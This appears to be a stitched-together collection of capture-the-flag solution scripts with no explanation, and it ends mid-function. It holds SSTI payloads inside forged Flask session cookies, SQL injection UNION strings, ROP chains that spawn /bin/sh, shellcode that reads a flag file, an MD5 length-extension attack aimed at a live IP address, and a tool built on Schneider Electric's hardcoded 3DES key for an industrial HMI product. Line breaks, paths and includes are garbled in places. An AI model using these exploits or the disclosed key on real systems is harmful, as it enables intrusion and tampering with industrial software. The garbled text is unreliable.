p = 64760524083545528318139240449356269097871629401328435356643510319660757701117
q = 109947782034870726628911928816041880655659770652764045401662566933641952899777
e = 65537
n = 7120275986401660066259983193598830554385933355254283093021239164350142898387660104515624591378875067038235085428170557400012848874756868985306042421950909
E = EllipticCurve(Zmod(n),[114514,1919810])
Eq = EllipticCurve(Zmod(p),[114514,1919810])
Ep = EllipticCurve(Zmod(q),[114514,1919810])
P = E(4143131125485719352848137000299706175276016714942734255688381872061184989156686585992844083387698688432978380177564346382756951426943827434190895490233627,3879946878859691332371384275396678851932267609535096278038417524609690721322205780110680003522999409696718745532857001461869452116434787256032366267905519)

phi = Ep.order()*Eq.order()
d = inverse_mod(e,phi)
G = P*d
x = G.xy()[0]
flag = long_to_bytes(int(x))
print(flag)
    #a67b2a9b-0542-4646
from Crypto.Util.number import *

p =  9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679
k =  73771953838487511457389800773038323262861649769228176071578897500004883270121
A1 =  (5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791,4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709)
C = (2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276,6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025)

a = inverse(A1[0]-C[0],p)*((A1[1]**2-A1[0]**3)-(C[1]**2-C[0]**3))% p
b = (C[1]**2-C[0]**3-a*C[0])%p

E = EllipticCurve(Zmod(p),[a,b])
A1 = E(A1)
C = E(C)
M = C-k*A1

mm = (M.xy())[0]
for i in range(292):
    m = long_to_bytes(int(mm-i))
    if m.endswith(b'}'):
        print(m)
#!/usr/bin/env python3
"""
Schneider Electric EcoStruxure Operator Terminal Expert Hardcoded Cryptographic Key Information Disclosure Vulnerability
SRC ....: SRC-2020-0010
CVE ....: N/A
File ...: EcoStruxure Operator Terminal Expert V3.1.iso
SHA1 ...: 386312d68ba5e6a98df24258f2fbcfb2d8c8521b
Download: https://download.schneider-electric.com/files?p_File_Name=EcoStruxure+Operator+Terminal+Expert+V3.1.iso
"""
import os
import re
import sys
import glob
import zlib
import zipfile
from Crypto.Cipher import DES3

# hardcoded values
key  = [ 202, 20, 221, 52, 225, 154, 5, 123, 111, 219, 11, 199, 145, 27, 200, 129, 254, 222, 253, 119, 213, 134, 72, 78 ]
iv   = [ 95, 21, 44, 250, 112, 73, 114, 155 ]
des3 = [ 93, 51, 117, 85, 189, 76, 88, 200, 231, 127 ]
plen  = 8

def check_equal(iterator):
   # if all the values are the same then its padding...
   return len(set(iterator)) <= 1

def _inflate(decoded_data):
    return zlib.decompress(decoded_data, -15)

def _deflate(string_val):
    compressed = zlib.compress(string_val)
    return compressed[2:-4]

def delete_folder(top) :
    for root, dirs, files in os.walk(top, topdown=False):
        for name in files:
            os.remove(os.path.join(root, name))
        for name in dirs:
            os.rmdir(os.path.join(root, name))
    os.rmdir(top)

def decrypt_file(filename):
    print("(+) unpacking: %s" % filename)
    decr = DES3.new(bytes(key), DES3.MODE_CBC, bytes(iv))
    default_data = bytes([8, 8, 8, 8, 8, 8, 8, 8])
    with open(filename, "rb") as f:
        if list(f.read(10)) == des3:
            encrypted = f.read()
            raw_data = decr.decrypt(encrypted)
            if not check_equal(list(raw_data)):
                raw_data = _inflate(raw_data)
        else:
            f.seek(0)
            raw_data = f.read() 
    # now that we have the decrypted data, let's overwrite the file...
    with open(filename, "wb") as f:
        f.write(raw_data)

def encrypt_file(filename):
    print("(+) packing: %s" % filename)
    encr = DES3.new(bytes(key), DES3.MODE_CBC, bytes(iv))
    with open(filename, "rb") as f:
        packed_data = f.read()
        if not packed_data == bytes([8, 8, 8, 8, 8, 8, 8, 8]):
            packed_data = _deflate(packed_data)
        # padding for encryption, same as schneider
        pad = plen - (len(packed_data) % plen)
        # if we just have padding in there, then dont bother adding more padding now...
        if len(packed_data) != 8:
            for i in range(0, pad):
                packed_data += bytes([pad])
        encr_data = bytes(des3) + encr.encrypt(packed_data)
    with open(filename, "wb") as f:
        f.write(encr_data)

def unpack(project):
    z = os.path.abspath(project)
    output_dir = os.path.splitext(z)[0]
    print("(+) unpacking to %s" % output_dir)
    if os.path.exists(output_dir):
        print("(-) %s already exists!" % output_dir)
        return False
    zip_obj = zipfile.ZipFile(z, 'r')
    zip_obj.extractall(output_dir)
    zip_obj.close()
    # two levels deep, we can do more if we need to
    for file in list(set(glob.glob(output_dir + '/**/**/*.*', recursive=True))):
        decrypt_file(file)
    print("(+) unpacked and decrypted: %s" % project)

def pack(project):
    z = os.path.abspath(project)
    output_dir = os.path.splitext(z)[0]
    # two levels deep, we can do more if we need to
    for file in list(set(glob.glob(output_dir + '/**/**/*.*', recursive=True))):
        if os.path.basename(file) != "[Content_Types].xml":
            encrypt_file(file)

    zf = zipfile.ZipFile(project, "w")
    for file in list(set(glob.glob(os.path.basename(output_dir) + '/**/**/*.*', recursive=True))):
        zf.write(file, "/".join(file.strip("/").split('/')[1:]))

    zf.close()
    delete_folder(output_dir)
    print("(+) packed and encrypted: %s" % project)

def main():
    if len(sys.argv) != 3:
        print("(+) usage: %s[options]" % sys.argv[0])
        print("(+) eg: %s sample.vxdz unpack" % sys.argv[0])
        print("(+) eg: %s sample.vxdz pack" % sys.argv[0])
        sys.exit(0)
    f = sys.argv[1]
    c = sys.argv[2]
    if c.lower() == "unpack":
        unpack(f)
    elif c.lower() == "pack":
        pack(f)
    else:
        print("(-) invalid option!")
        sys.exit(1)

if __name__ == '__main__':
    main()
import os
import itertools
import zlib
from tqdm import tqdm

def read_binary_file(file_path):
    with open(file_path, "rb") as f:
        return f.read()

def try_decompress(data):
    try:
        decompressed_data = zlib.decompress(data, -zlib.MAX_WBITS)
        return decompressed_data
    
except zlib.error:
        return None

def calculate_crc32(data):
    if len(data) != 105734:
        return None
    return zlib.crc32(data) & 0xFFFFFFFF

def main():
    directory = "屁"  # 指定目录
    # 指定开头和结尾文件
    start_file = os.path.join(directory, "屁.z66")
    end_file = os.path.join(directory, "屁.z40")
    files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

    # 移除开头和结尾文件
    files.remove(start_file)
    files.remove(end_file)

    # 生成剩余文件的全排列
    permutations = itertools.permutations(files)

    # 计算排列的总数
    total_permutations = sum(1 for _ in permutations)

    # 重置 permutations 以便再次迭代
    permutations = itertools.permutations(files)

    # 已知的CRC32值
    known_crc32 = 0x0B6E238E

    for perm in tqdm(permutations, total=total_permutations, desc="Processing"):
        # 将开头和结尾文件固定在首尾
        combined_files = [start_file] + list(perm) + [end_file]
        # 连接所有文件的二进制内容
        combined_data = b"".join(read_binary_file(file_path) for file_path in combined_files)

        # 尝试解压缩
        decompressed_data = try_decompress(combined_data)

        if decompressed_data is not None:
            # 计算解压后数据的CRC32值
            calculated_crc32 = calculate_crc32(decompressed_data)

            # 检查CRC32值是否匹配
            if calculated_crc32 == known_crc32:
                print("解压成功！")
                # 输出解压后的数据
                with open("屁.svp", "wb") as f:
                    f.write(decompressed_data)
                print("解压后的数据已保存到 屁.svp")
                break
    else:
        print("没有找到可以成功解压的排列顺序。")

if __name__ == "__main__":
    main()
S.,H.,C.,T.,F.,Open Curly Bracket,B.,L.,four,C.,K.,Underscore,M.,Y.,seven,H.,colon,five,H.,four,N.,H.,three,Close Curly Bracket
import zlib

flag=''
crc_list = [xxx]
for target_crc in crc_list:
    for i in range(256):
        for j in range(256):
            for k in range(256):
                data = bytes([i, j, k])  # 构造3字节数据
                crc = zlib.crc32(data) & 0xffffffff  # 计算CRC32值
                if crc == target_crc:
                    data=data.decode()
                    print(f"Found matching data: {data}")
                    flag+=data
                    break

print('解密得到:'+flag)
欢迎登录admin!这里是你的flag: SHCTF{y0u_v3r1F1ed_Y0U_aRe_yOU_xxxxxxxxxxxx}
import flask
import random
from flask import Flask, request, render_template, send_file

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', first_num = first_num)  

@app.route('/source')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
    
@app.route('/first')
def get_first_number():
    return str(first_num)
    
@app.route('/guess')
def verify_seed():
    num = request.args.get('num')
    if num == str(second_num):
        with open("/flag", "r") as file:
            return file.read()
    return "nonono"
 
def init():
    global seed, first_num, second_num
    seed = random.randint(1000000,9999999)
    random.seed(seed)
    first_num = random.randint(1000000000,9999999999)
    second_num = random.randint(1000000000,9999999999)

init()
app.run(debug=True)
import random

first_num = int(input(""))
for i in range(1000000,9999999,1):
    random.seed(i)
    num = random.randint(1000000000,9999999999)
    if num == first_num:
        second_num = random.randint(1000000000,9999999999)
        print("second_num: " + str(second_num))
        exit()
def check_sign(sign, username, msg, salt):
    if sign == md5(salt + msg + username):
        return True
    return False

@app.route("/")
def index():
    if session.get('sign') == None or session.get('username') == None or session.get('msg') == None:
        return redirect("/login")
    sign = session.get('sign')
    username = session.get('username')
    msg = session.get('msg')
    if check_sign(sign, username, msg, salt):
        sign_users[username.decode()] = 1
        return "签到成功"
    return redirect("/login")
import hashlib
import math
from typing import Any, Dict, List

rotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
                  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]

constants = [int(abs(math.sin(i + 1)) * 2 ** 32) & 0xFFFFFFFF for i in range(64)]

functions = 16 * [lambda b, c, d: (b & c) | (~b & d)] + 
            16 * [lambda b, c, d: (d & b) | (~d & c)] + 
            16 * [lambda b, c, d: b ^ c ^ d] + 
            16 * [lambda b, c, d: c ^ (b | ~d)]

index_functions = 16 * [lambda i: i] + 
                  16 * [lambda i: (5 * i + 1) % 16] + 
                  16 * [lambda i: (3 * i + 5) % 16] + 
                  16 * [lambda i: (7 * i) % 16]

def get_init_values(A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> List[int]:
    return [A, B, C, D]

def left_rotate(x, amount):
    x &= 0xFFFFFFFF
    return ((x << amount) | (x >> (32 - amount))) & 0xFFFFFFFF

def padding_message(msg: bytes) -> bytes:
    """
    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。
    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。
    填充的方法如下：
        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。
        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。
    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。
    """
    orig_len_in_bits = (8 * len(msg)) & 0xffffffffffffffff
    msg += bytes([0x80])
    while len(msg) % 64 != 56:
        msg += bytes([0x00])
    msg += orig_len_in_bits.to_bytes(8, byteorder='little')
    return msg

def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> int:
    message = padding_message(message)
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:
chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))

def md5_to_hex(digest: int) -> str:
    raw = digest.to_bytes(16, byteorder='little')
    return '{:
032x}'.format(int.from_bytes(raw, byteorder='big'))

def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> str:
    return md5_to_hex(md5(message, A, B, C, D))

def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe,
               D: int = 0x10325476) -> int:
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:
chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))

def get_init_values_from_hash_str(real_hash: str) -> List[int]:
    """

    Args:
        real_hash: 真实的hash结算结果

    Returns: 哈希初始化值[A, B, C, D]

    """
    str_list: List[str] = [real_hash[i * 8:(i + 1) * 8] for i in range(4)]
    # 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字
    return [int.from_bytes(int('0x' + s, 16).to_bytes(4, byteorder='little'), byteorder='big') for s in str_list]

def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: str, append_data: bytes) -> Dict[str, Any]:
    """

    Args:
        origin_msg: 原始的消息字节流
        key_len: 原始密钥（盐）的长度
        real_hash: 计算出的真实的hash值
        append_data: 需要添加的攻击数据

    Returns: 发起攻击需要的物料信息
        {
            'attack_fake_msg': bytes([...]),
            'attack_hash_value': str(a1b2c3d4...)
        }

    """
    init_values = get_init_values_from_hash_str(real_hash)
    # print(['{:
08x}'.format(x) for x in init_values])
    # 只知道key的长度，不知道key的具体内容时，任意填充key的内容
    fake_key: bytes = bytes([0xff for _ in range(key_len)])
    # 计算出加了append_data后的真实填充数据
    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)
    # 攻击者提前计算添加了攻击数据的哈希
    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key + origin_msg)):],
                                              A=init_values[0],
                                              B=init_values[1],
                                              C=init_values[2],
                                              D=init_values[3]))
    fake_padding_data = padding_message(fake_key + origin_msg)[len(fake_key + origin_msg):]
    attack_fake_msg = origin_msg + fake_padding_data + append_data
    return {'attack_fake_msg': attack_fake_msg, 'attack_hash_value': attack_hash_value}

from flask.sessions import SecureCookieSessionInterface
import requests, json, time

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def session_decode(session_cookie_value, secret_key):
    """ Decode a Flask cookie  """
    app = MockApp(secret_key)
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.loads(session_cookie_value)

def session_encode(session_cookie_structure, secret_key):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)
        # session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    
except Exception as e:
        return "[Encoding error] {}".format(e)

def req_index(url, cookie):
    # headers = {"Cookie": "session=" + cookie}
    cookies = {"session":
cookie}
    r = requests.get(url, cookies=cookies).text
    # print(r)
    if '签到成功' not in r:
        # print(cookie)
        time.sleep(1)
        req_index(url, cookie)
        # print(r)

def req_user(url):
    return json.loads(requests.get(url).text)

def req_login(url):
    data = {"username":"student", "password":"student"}
    cookie = requests.post(url, data).headers["Set-Cookie"][8:].split(';')[0]
    # print(cookie)
    return cookie

def hash_Attack(md5_value, key_len, data, attack_data):
    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)
    # print(data)
    res = {"username":
attack_data, "msg":
attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":
attack_materials['attack_hash_value'].encode()}
    return res

if __name__ == '__main__':
    url = "http://210.44.150.15:
49982/"
    cookie = req_login(url+'login')
    users = req_user(url+'users')
    secret_key = "Th1s_is_5ecr3t_k3y"
    res = session_decode(cookie, secret_key)
    for user in users:
        if users[user] == 0:
            res = hash_Attack(res["sign"], 16, res["msg"]+res["username"], user.encode())
            res2 = session_encode(res, secret_key)
            # time.sleep(1)
            r = req_index(url, res2)
D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg" -s "0day_joker"
D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"
D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"
D:
toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"
SELECT username,password FROM users WHERE id = ("
-1") union select 1,scretdata from ctf.flag
-1") union select 1,column_comment from information_schema.columns
from pwn import *
context.log_level = 'debug'

p = process('./pwn')

open_addr = 0x97
vuln_addr = 0xBB

p.recvuntil('giftn')

payload = b'a' * (0x10 + 8) + p8(vuln_addr)
p.send(payload)
p.recvline()

payload = b'a' * (0x10 + 8) + p8(open_addr)
p.send(payload)
p.recvline()

p.interactive()
from pwn import *
p1 = remote('ip',port)
p2 = remote('ip',port)
p1.send(p64(0x404121))
time.sleep(1)
p2.send(p64(0x404120))
p2.close()
p1.interactive()
push 0x67616c66//压入flag文件名到栈中
 mov rdi,rsp
 xor rsi,rsi
 xor rdx,rdx
 mov rax,2
 syscall//open打开文件
 mov rdi,3
 mov rsi,rsp
 mov rdx,0x100
 mov rax,0
 syscall//读取flag文件内容到栈中
 //开始字符串的比较
 cmpb [rsp+{i}],{j}
 jz Loop//若字符串的第i个字符为j就跳转到Loop
 ret//否则直接退出
 Loop:
 mov rdi,0
 mov rsi,rsp
 mov rdx,0x10
 mov rax,0
 syscall//Loop会调用read读取用户输入
from pwn import *
from tqdm import tqdm

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'critical'
# p = gdb.debug('./main','b main')
flag = ''
ctable = [x for x in range(ord('0'),ord('9')+1)]+[ord('-'),ord('{'),ord('}')]+[x for x in range(ord('a'),ord('z')+1)]
for i in range(0,0x30):
    for j in tqdm(ctable):
        p = remote('ip',port)
        assembly = f'''
        push 0x67616c66
        mov rdi,rsp
        xor rsi,rsi
        xor rdx,rdx
        mov rax,2
        syscall
        mov rdi,3
        mov rsi,rsp
        mov rdx,0x100
        mov rax,0
        syscall
        cmpb [rsp+{i}],{j}
        jz Loop
        ret
        Loop:
        mov rdi,0
        mov rsi,rsp
        mov rdx,0x10
        mov rax,0
        syscall
        ret
        '''
        shellcode = asm(assembly)
        p.send(shellcode)
        try:
            #如果在timeout时间内报错eof就会直接进入except，相反代表字符正确，会继续执行flag+=chr(j)
            p.recv(10,timeout=2)#根据环境的差异可以调节timeout时长
            p.close()
            flag += chr(j)
            break
        
except:
            p.close()
    print(flag)
from pwn import *
from ctypes import *
from struct import pack
banary = "./pwn"
elf = ELF(banary)
libc = ELF("./libc.so.6")
    #libc=ELF("/lib/i386-linux-gnu/libc.so.6")
ip = ''
port = 0
local = 1
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
    #context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00'))
uu64 = lambda : u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

main=0x08049432
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

payload=b'A'*0x48+b'A'*4+p32(puts_plt)+p32(main)+p32(puts_got)
send_data=b'{"name":"'+payload+b'","age":21}'
ru("How to send data?")
sl(send_data)
ru("age:
134549548n")
libcbase=u32(io.recv()[0:4])-libc.sym['puts']
lg("libcbase")
system=libcbase+libc.sym['system']
bin_sh=libcbase+next(libc.search(b'/bin/shx00'))

payload=b'A'*0x48+b'A'*4+p32(system)+p32(0xdeadbeef)+p32(bin_sh)
send_data=b'{"name":"'+payload+b'","age":21}'
sl(send_data)

ia()
from pwn import *
from ctypes import *
from struct import pack
banary = "./pwn"
elf = ELF(banary)
    #libc = ELF("./libc.so.6")
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
ip = ''
port = 0
local = 1
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
    #context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00'))
uu64 = lambda : u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

num=0x8052074

payload=b'A%998c%10$hn'+p32(num)
send_data=b'{"name":"'+payload+b'","age":18}'
ru("How to send data?")
sl(send_data)

ia()
// 必须写在 Java 虚拟机中 
Java.perform(function() {
    let MainActivity = Java.use("com.example.test.MainActivity");
MainActivity["check"].implementation = function (str) {
    console.log(`MainActivity.check is called: str=${str}`);
    let result = this["check"](str);
    console.log(`MainActivity.check result=${result}`);
    return 1;
};
})
    #include 
    #include <stdint.h>
void decrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], i; 
    uint32_t delta=0x61C88747;  
    uint32_t sum=0;                 
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<0x40; i++) {                         /* basic cycle start */
        v0 += v1 ^ (k[ (sum & 3)] + sum) ^ (v1 + ((v1 >> 5) ^ ( v1 <<4 )));
        sum -= 0x61C88747;
        v1 += v0 ^ (k [((sum >> 11) & 3)] + sum) ^ (v0 + ((v0 >> 5) ^ (v0<<4)));
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

int main(){
    uint32_t enc[]={0x18c2e339,0xe9550982,0x108a30f7,0x018430dd,0xd5de57b0,0xd43e0740,0xf42fdde4,0x968886e8,0xe5d77b79,0x685d758f};
    uint32_t key[]={1,1,2,3};
    for (size_t i = 0; i < 10; i+=2)
    {
        decrypt(enc+i,key);
    }
    puts((char*)enc);

}
/*exp 如下*/
    #include
using namespace std;
int main() {
    char tmp=0;
    char flag[255] = "!}ggagllllff_fau_hisY_keF{CTSH";
    for (int i = 0; i < 14; i++) {
        tmp = flag[29 - i];
        flag[29 - i] = flag[i];
        flag[i] = tmp;
    }
    for (int i = 0; i < 29; i += 2) {
        tmp = flag[i];
        flag[i] = flag[i + 1];
        flag[i + 1] = tmp;
    }
    cout<<flag;
 }
 /*
 SHCTF{keY_is_hua_fffllllaggg!}
 */
obj.secretKey = "[f#fLw)??Pz?#9w)Du[ks[q[#w4D?4P4UJf,kU[f.rDkfwrDtq...)?J.#rP4[qrPDJkkJ|.9J|qffU?k|D4P4P[wkk.)k?JUJ[k#9kww[r??wUfw|PkrPUf.P#f.P#.PwJ4f4q.PU4UPDr9.[9fJ#PqP)cDDffJPDrJ.J4qPP[r[.JfJ4f|?U9#";
def decode(ciphertext):

    result = []
    
    for char in ciphertext:
        y = ord(char) - 32
        decrypted_char = ((y - 1919810) * 39) % 95
        x = (decrypted_char + 95) % 95
        result.append(chr(x + 32))
        
    return "".join(result)

ciphertext = "[f#fLw)??Pz?#9w)Du[ks[q[#w4D?4P4UJf,kU[f.rDkfwrDtq...)?J.#rP4[qrPDJkkJ|.9J|qffU?k|D4P4P[wkk.)k?JUJ[k#9kww[r??wUfw|PkrPUf.P#f.P#.PwJ4f4q.PU4UPDr9.[9fJ#PqP)cDDffJPDrJ.J4qPP[r[.JfJ4f|?U9#"

plaintext = decode(ciphertext)

print(plaintext)
# b4c4S20331H3cf208Cb9Tbebc2a83a1a6d4F96b45-8942-8{e55503d5c-1abe-18d99d75fd7e4463978a1a1b2995093d6db9cf922b-332642719-16451c451c512da4ae516a618-f5bf4dc1e10}8844d18-d5dae11b-b5d4da4736fc
import numpy as np
from mazelib.solve.ShortestPaths import ShortestPaths
from mazelib import Maze

def check_ground(grid, x, y):
    directions = [(-1, 0), (1, 0), (0, -1), (0, 1)]
    count = 0
    for dx, dy in directions:
        nx, ny = x + dx, y + dy
        if 0 <= nx < len(grid[0]) and 0 <= ny < len(grid) and grid[ny][nx] == " ":
            count += 1
    return count

def fill_flag(grid, flag):
    flag_index = 0
    for y in range(len(grid)):
        for x in range(len(grid[0])):
            if grid[y][x] == " " and check_ground(grid, x, y) > 2:
                grid[y][x] = flag[flag_index]
                flag_index += 1
    return grid

maze = [['#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#','#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#','#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#','#'],
'''
'''
['#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#','#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#','#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '#','#', '#', '#', '#', '#', '#', '#']]

f1ag = "b4c4S20331H3cf208Cb9Tbebc2a83a1a6d4F96b45-8942-8{e55503d5c-1abe-18d99d75fd7e4463978a1a1b2995093d6db9cf922b-332642719-16451c451c512da4ae516a618-f5bf4dc1e10}8844d18-d5dae11b-b5d4da4736fc"

# maze[77][1] = "E"
# maze[1][83] = "S"

m = Maze()
m.grid = np.array([[1 if cell == '#' else 0 for cell in row] for row in maze], dtype=np.int8)
m.start = (1, 83)
m.end = (77, 1)
m.solver = ShortestPaths()
m.solve()

maze = fill_flag(maze, f1ag)

for i, j in m.solutions[0]:
    if maze[i][j] != " ":
        print(maze[i][j], end="")
# SHCTF{81f6ad65-9da6-41ae-bd61-88dea61332f1}
public byte[] GetData(Context p0){
       byte[] uobyteArray4;
       int i = this;
       byte[] uobyteArray = new byte[1];
       byte[] uobyteArray1 = uobyteArray;
       uobyteArray1[0] = (byte)1;
       byte[] uobyteArray2 = uobyteArray1;
       Context uContext = p0;
       try{
          byte[] uobyteArray3 = i.copyAssetFile(uContext.getAssets(), "enc");
          if (uobyteArray3 != null && uobyteArray3.length >= 4) {
             uobyteArray2 = i.loadData(uobyteArray3);
          }
          uobyteArray4 = uobyteArray2;
       }catch(java.io.IOException e7){
          e7.printStackTrace();
          uobyteArray4 = uobyteArray2;
       }
       return uobyteArray4;
    }
    
    public void onClick(View p0){
       InMemoryDexClassLoader inMemoryDexC1;
       int i = this;
       byte[] uobyteArray = i.this$0.GetData(i.val$context);
       try{
          byte[] uobyteArray1 = uobyteArray;
          if (Build$VERSION.SDK_INT >= 29) {
             InMemoryDexClassLoader inMemoryDexC = uobyteArray;
             inMemoryDexC1 = inMemoryDexC;
             InMemoryDexClassLoader inMemoryDexC2 = inMemoryDexC;
             ByteBuffer[] uByteBufferA = new ByteBuffer[1];
             ByteBuffer[] uByteBufferA1 = uByteBufferA;
             uByteBufferA = uByteBufferA1;
             uByteBufferA1[0] = ByteBuffer.wrap(uobyteArray1);
             File uFile = v12;
             uFile = new File(i.this$0.getClassLoader().findLibrary("eazyre"));
             inMemoryDexC2 = new InMemoryDexClassLoader(uByteBufferA, uFile.getParent(), i.this$0.getClassLoader().getParent());
          }else {
             inMemoryDexC1 = null;
          }
          Class uClass = inMemoryDexC1.loadClass("com.android.loader.GetFlag");
          String str = "VerifyFlag";
          Class[] uClassArray = new Class[1];
          Class[] uClassArray1 = uClassArray;
          uClassArray = uClassArray1;
          Class[] uClassArray2 = uClassArray1;
          try{
             int i2 = 0;
